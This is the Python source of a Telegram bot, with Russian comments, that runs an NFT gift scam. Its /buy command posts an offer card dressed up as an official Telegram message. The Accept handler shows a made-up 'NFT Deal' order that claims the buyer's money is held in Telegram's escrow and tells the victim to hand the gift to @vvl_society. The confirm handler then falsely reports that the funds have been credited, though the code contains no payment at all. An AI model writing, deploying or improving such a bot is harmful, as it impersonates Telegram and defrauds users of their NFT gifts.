import asyncio
import logging
import os
import re
from aiohttp import web
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardButton, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder

BOT_TOKEN = os.environ.get("BOT_TOKEN")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

active_deals = {}

# --- Функция: разбор ссылки NFT ---
def parse_nft_link(url):
    """
    Из ссылки https://t.me/nft/ViceCream-302895
    достаёт: {"name": "Vice Cream", "number": "302895", "full": "Vice Cream #302895"}
    """
    # Ищем паттерн: /nft/Название-Цифры
    match = re.search(r"t\.me/nft/([A-Za-z0-9_]+)-(\d+)", url)
    if not match:
        return None
    
    raw_name = match.group(1)   # "ViceCream" или "SnoopDogg"
    number = match.group(2)     # "302895" или "9203"
    
    # Разбиваем CamelCase на слова: "ViceCream" -> "Vice Cream", "SnoopDogg" -> "Snoop Dogg"
    # Вставляем пробел перед каждой заглавной буквой (кроме первой)
    name_with_spaces = re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
    
    return {
        "name": name_with_spaces,
        "number": number,
        "full": f"{name_with_spaces} #{number}",
        "raw_name": raw_name
    }


# --- Команда /buy ---
@dp.message(Command("buy"))
async def cmd_buy(message: types.Message):
    args = message.text.split()
    
    if len(args) < 4:
        await message.answer(
            "⚠️ Использование: `/buy <ссылка_на_NFT> <сумма> <валюта>`\n"
            "Пример: `/buy https://t.me/nft/ViceCream-302895 1000 STARS`"
        )
        return

    nft_link = args[1]
    amount = args[2]
    currency = args[3].upper()

    # Парсим ссылку
    nft_data = parse_nft_link(nft_link)
    
    if not nft_data:
        await message.answer(
            "⚠️ Неверная ссылка на NFT.\n"
            "Правильный формат: `https://t.me/nft/Название-Номер`\n"
            "Пример: `https://t.me/nft/ViceCream-302895`"
        )
        return

    nft_title = nft_data["full"]  # "Vice Cream #302895"

    # Формируем текст предложения (как на скрине 1)
    text = (
        f"<b>Telegram\n"
        f"{nft_title}</b>\n\n"
        f"Пользователь предлагает вам\n"
        f"<b>{amount} {currency}</b> за подарок <b>{nft_title}</b>.\n\n"
        f"Оффер действителен ещё 6 ч. 0 мин."
    )

    # Кнопки Отклонить и Принять
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"decline_{message.from_user.id}"),
        InlineKeyboardButton(text="✅ Принять", callback_data=f"accept_{message.from_user.id}")
    )

    # Сохраняем данные сделки
    deal_id = str(message.from_user.id)
    active_deals[deal_id] = {
        "link": nft_link,
        "amount": amount,
        "currency": currency,
        "title": nft_title
    }

    # Отправляем карточку (текстом). 
    # Опционально: можно прикрепить "заглушку"-картинку слева от текста,
    # но раз парсинг картинки не работает, оставляем чистый текст.
    await message.answer(
        text=text,
        reply_markup=builder.as_markup(),
        parse_mode="HTML",
        disable_web_page_preview=False  # Telegram сам подтянет превью, если сможет
    )


# --- Обработка "Отклонить" ---
@dp.callback_query(F.data.startswith("decline_"))
async def process_decline(callback: CallbackQuery):
    await callback.message.edit_text("❌ Предложение отклонено")
    await callback.answer()


# --- Обработка "Принять" ---
@dp.callback_query(F.data.startswith("accept_"))
async def process_accept(callback: CallbackQuery):
    await callback.answer(
        text="Внимание!\n\nСледуйте инструкции, чтобы не потерять подарок и получить оплату.\n\nНажмите «ОК», если вы прочитали это сообщение.",
        show_alert=True
    )
    await asyncio.sleep(1.5)
    
    deal_id = callback.data.split("_")[1]
    deal = active_deals.get(deal_id)
    if not deal:
        await callback.message.edit_text("⚠️ Ошибка: данные о сделке утеряны.")
        return

    # Формируем финальный текст (как на скрине 3)
    final_text = (
        f"<b>NFT Deal</b>\n\n"
        f"Ордер #TG-D721BSTP\n\n"
        f"Покупатель зарезервировал <b>{deal['amount']} {deal['currency']}</b> "
        f"через эскроу-систему Telegram.\n"
        f"Средства хранятся на специальном эскроу-счёте и будут автоматически "
        f"зачислены на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
        f"<b>Инструкция для завершения сделки:</b>\n"
        f"1. Передайте подарок пользователю: @vvl_society\n"
        f"2. Нажмите «Передать NFT» и выберите {deal['title']}\n"
        f"3. Подтвердите передачу подарка.\n\n"
        f"Telegram зафиксирует транзакцию и моментально зачислит "
        f"{deal['amount']} {deal['currency']} на ваш баланс. Резерв действует 24 часа."
    )

    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="Передать NFT", url=deal["link"])
    )
    builder.row(
        InlineKeyboardButton(text="Подтвердить передачу", callback_data=f"confirm_{deal_id}")
    )

    await callback.message.edit_text(
        text=final_text,
        reply_markup=builder.as_markup(),
        parse_mode="HTML",
        disable_web_page_preview=False
    )


# --- Подтверждение передачи ---
@dp.callback_query(F.data.startswith("confirm_"))
async def process_confirm(callback: CallbackQuery):
    await callback.answer("✅ Транзакция подтверждена!", show_alert=True)
    await callback.message.edit_text("✅ Сделка завершена. Средства зачислены на ваш баланс.")


# --- Веб-сервер для Render ---
async def handle(request):
    return web.Response(text="Bot is alive!")

async def main():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', int(os.environ.get("PORT", 8080)))
    await site.start()
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())